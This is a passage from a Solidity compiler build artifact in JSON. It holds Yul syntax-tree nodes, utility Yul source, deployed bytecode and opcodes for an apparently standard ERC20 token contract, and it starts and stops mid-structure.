																				"nodeType": "YulLiteral",
																				"src": "5292:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5277:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5277:18:5"
																	},
																	{
																		"hexValue": "657373",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "5297:5:5",
																		"type": "",
																		"value": "ess"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5270:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5270:33:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5270:33:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "5312:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "5324:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5335:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "5320:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5320:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "5312:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_0557e210f7a69a685100a7e4e3d0a7024c546085cee28910fd17d0b081d9516f__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "5097:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "5111:4:5",
														"type": ""
													}
												],
												"src": "4946:399:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "5524:228:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "5541:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5552:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5534:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5534:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5534:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5575:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "5586:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5571:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5571:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5591:2:5",
																		"type": "",
																		"value": "38"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5564:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5564:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5564:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5614:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "5625:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5610:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5610:18:5"
																	},
																	{
																		"hexValue": "45524332303a207472616e7366657220616d6f756e7420657863656564732062",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "5630:34:5",
																		"type": "",
																		"value": "ERC20: transfer amount exceeds b"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5603:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5603:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5603:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5685:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "5696:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5681:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5681:18:5"
																	},
																	{
																		"hexValue": "616c616e6365",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "5701:8:5",
																		"type": "",
																		"value": "alance"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5674:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5674:36:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5674:36:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "5719:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "5731:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5742:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "5727:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5727:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "5719:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_4107e8a8b9e94bf8ff83080ddec1c0bffe897ebc2241b89d44f66b3d274088b6__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "5501:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "5515:4:5",
														"type": ""
													}
												],
												"src": "5350:402:5"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart, value0) -> tail\n    {\n        let _1 := 32\n        mstore(headStart, _1)\n        let length := mload(value0)\n        mstore(add(headStart, _1), length)\n        let i := 0\n        for { } lt(i, length) { i := add(i, _1) }\n        {\n            mstore(add(add(headStart, i), 64), mload(add(add(value0, i), _1)))\n        }\n        mstore(add(add(headStart, length), 64), 0)\n        tail := add(add(headStart, and(add(length, 31), not(31))), 64)\n    }\n    function abi_decode_address(offset) -> value\n    {\n        value := calldataload(offset)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n    }\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1\n    {\n        if slt(sub(dataEnd, headStart), 64) { revert(0, 0) }\n        value0 := abi_decode_address(headStart)\n        value1 := calldataload(add(headStart, 32))\n    }\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, iszero(iszero(value0)))\n    }\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, value0)\n    }\n    function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2\n    {\n        if slt(sub(dataEnd, headStart), 96) { revert(0, 0) }\n        value0 := abi_decode_address(headStart)\n        value1 := abi_decode_address(add(headStart, 32))\n        value2 := calldataload(add(headStart, 64))\n    }\n    function abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, 0xff))\n    }\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        value0 := abi_decode_address(headStart)\n    }\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1\n    {\n        if slt(sub(dataEnd, headStart), 64) { revert(0, 0) }\n        value0 := abi_decode_address(headStart)\n        value1 := abi_decode_address(add(headStart, 32))\n    }\n    function extract_byte_array_length(data) -> length\n    {\n        length := shr(1, data)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) { length := and(length, 0x7f) }\n        if eq(outOfPlaceEncoding, lt(length, 32))\n        {\n            mstore(0, shl(224, 0x4e487b71))\n            mstore(4, 0x22)\n            revert(0, 0x24)\n        }\n    }\n    function checked_add_t_uint256(x, y) -> sum\n    {\n        sum := add(x, y)\n        if gt(x, sum)\n        {\n            mstore(0, shl(224, 0x4e487b71))\n            mstore(4, 0x11)\n            revert(0, 0x24)\n        }\n    }\n    function abi_encode_tuple_t_stringliteral_f8b476f7d28209d77d4a4ac1fe36b9f8259aa1bb6bddfa6e89de7e51615cf8a8__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 37)\n        mstore(add(headStart, 64), \"ERC20: decreased allowance below\")\n        mstore(add(headStart, 96), \" zero\")\n        tail := add(headStart, 128)\n    }\n    function abi_encode_tuple_t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 36)\n        mstore(add(headStart, 64), \"ERC20: approve from the zero add\")\n        mstore(add(headStart, 96), \"ress\")\n        tail := add(headStart, 128)\n    }\n    function abi_encode_tuple_t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 34)\n        mstore(add(headStart, 64), \"ERC20: approve to the zero addre\")\n        mstore(add(headStart, 96), \"ss\")\n        tail := add(headStart, 128)\n    }\n    function abi_encode_tuple_t_stringliteral_3b6607e091cba9325f958656d2b5e0622ab7dc0eac71a26ac788cb25bc19f4fe__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 29)\n        mstore(add(headStart, 64), \"ERC20: insufficient allowance\")\n        tail := add(headStart, 96)\n    }\n    function abi_encode_tuple_t_stringliteral_baecc556b46f4ed0f2b4cb599d60785ac8563dd2dc0a5bf12edea1c39e5e1fea__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 37)\n        mstore(add(headStart, 64), \"ERC20: transfer from the zero ad\")\n        mstore(add(headStart, 96), \"dress\")\n        tail := add(headStart, 128)\n    }\n    function abi_encode_tuple_t_stringliteral_0557e210f7a69a685100a7e4e3d0a7024c546085cee28910fd17d0b081d9516f__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 35)\n        mstore(add(headStart, 64), \"ERC20: transfer to the zero addr\")\n        mstore(add(headStart, 96), \"ess\")\n        tail := add(headStart, 128)\n    }\n    function abi_encode_tuple_t_stringliteral_4107e8a8b9e94bf8ff83080ddec1c0bffe897ebc2241b89d44f66b3d274088b6__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 38)\n        mstore(add(headStart, 64), \"ERC20: transfer amount exceeds b\")\n        mstore(add(headStart, 96), \"alance\")\n        tail := add(headStart, 128)\n    }\n}",
									"id": 5,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461012357806370a082311461013657806395d89b411461015f578063a457c2d714610167578063a9059cbb1461017a578063dd62ed3e1461018d57600080fd5b806306fdde03146100ae578063095ea7b3146100cc57806318160ddd146100ef57806323b872dd14610101578063313ce56714610114575b600080fd5b6100b66101a0565b6040516100c3919061069c565b60405180910390f35b6100df6100da366004610706565b610232565b60405190151581526020016100c3565b6002545b6040519081526020016100c3565b6100df61010f366004610730565b61024c565b604051601281526020016100c3565b6100df610131366004610706565b610270565b6100f361014436600461076c565b6001600160a01b031660009081526020819052604090205490565b6100b6610292565b6100df610175366004610706565b6102a1565b6100df610188366004610706565b610321565b6100f361019b36600461078e565b61032f565b6060600380546101af906107c1565b80601f01602080910402602001604051908101604052809291908181526020018280546101db906107c1565b80156102285780601f106101fd57610100808354040283529160200191610228565b820191906000526020600020905b81548152906001019060200180831161020b57829003601f168201915b5050505050905090565b60003361024081858561035a565b60019150505b92915050565b60003361025a85828561047e565b6102658585856104f8565b506001949350505050565b600033610240818585610283838361032f565b61028d91906107fb565b61035a565b6060600480546101af906107c1565b600033816102af828661032f565b9050838110156103145760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b60648201526084015b60405180910390fd5b610265828686840361035a565b6000336102408185856104f8565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b6001600160a01b0383166103bc5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161030b565b6001600160a01b03821661041d5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161030b565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b600061048a848461032f565b905060001981146104f257818110156104e55760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161030b565b6104f2848484840361035a565b50505050565b6001600160a01b03831661055c5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161030b565b6001600160a01b0382166105be5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161030b565b6001600160a01b038316600090815260208190526040902054818110156106365760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161030b565b6001600160a01b03848116600081815260208181526040808320878703905593871680835291849020805487019055925185815290927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a36104f2565b600060208083528351808285015260005b818110156106c9578581018301518582016040015282016106ad565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461070157600080fd5b919050565b6000806040838503121561071957600080fd5b610722836106ea565b946020939093013593505050565b60008060006060848603121561074557600080fd5b61074e846106ea565b925061075c602085016106ea565b9150604084013590509250925092565b60006020828403121561077e57600080fd5b610787826106ea565b9392505050565b600080604083850312156107a157600080fd5b6107aa836106ea565b91506107b8602084016106ea565b90509250929050565b600181811c908216806107d557607f821691505b6020821081036107f557634e487b7160e01b600052602260045260246000fd5b50919050565b8082018082111561024657634e487b7160e01b600052601160045260246000fdfea2646970667358221220d4a03f46816d8abc72fd918a2322f2a3c568a20318b17dfd2264e68a262d9d2764736f6c63430008120033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x123 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x136 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x15F JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x167 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x18D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xCC JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x101 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x114 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x1A0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC3 SWAP2 SWAP1 PUSH2 0x69C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xDF PUSH2 0xDA CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH1 0x2 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x10F CALLDATASIZE PUSH1 0x4 PUSH2 0x730 JUMP JUMPDEST PUSH2 0x24C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x131 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x270 JUMP JUMPDEST PUSH2 0xF3 PUSH2 0x144 CALLDATASIZE PUSH1 0x4 PUSH2 0x76C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xB6 PUSH2 0x292 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x175 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x2A1 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x188 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x321 JUMP JUMPDEST PUSH2 0xF3 PUSH2 0x19B CALLDATASIZE PUSH1 0x4 PUSH2 0x78E JUMP JUMPDEST PUSH2 0x32F JUMP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x1AF SWAP1 PUSH2 0x7C1 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x1DB SWAP1 PUSH2 0x7C1 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x228 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1FD JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x228 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x20B JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x35A JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x25A DUP6 DUP3 DUP6 PUSH2 0x47E JUMP JUMPDEST PUSH2 0x265 DUP6 DUP6 DUP6 PUSH2 0x4F8 JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x283 DUP4 DUP4 PUSH2 0x32F JUMP JUMPDEST PUSH2 0x28D SWAP2 SWAP1 PUSH2 0x7FB JUMP JUMPDEST PUSH2 0x35A JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x1AF SWAP1 PUSH2 0x7C1 JUMP JUMPDEST PUSH1 0x0 CALLER DUP2 PUSH2 0x2AF DUP3 DUP7 PUSH2 0x32F JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x314 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x207A65726F PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x265 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x35A JUMP JUMPDEST PUSH1 0x0 CALLER PUSH2 0x240 DUP2 DUP6 DUP6 PUSH2 0x4F8 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x3BC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x41D JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x48A DUP5 DUP5 PUSH2 0x32F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 NOT DUP2 EQ PUSH2 0x4F2 JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x30B JUMP JUMPDEST PUSH2 0x4F2 DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x35A JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x55C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x5BE JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 DUP2 LT ISZERO PUSH2 0x636 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x616C616E6365 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x30B JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x20 DUP2 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP8 DUP8 SUB SWAP1 SSTORE SWAP4 DUP8 AND DUP1 DUP4 MSTORE SWAP2 DUP5 SWAP1 KECCAK256 DUP1 SLOAD DUP8 ADD SWAP1 SSTORE SWAP3 MLOAD DUP6 DUP2 MSTORE SWAP1 SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x4F2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x6C9 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x6AD JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x701 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x719 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x722 DUP4 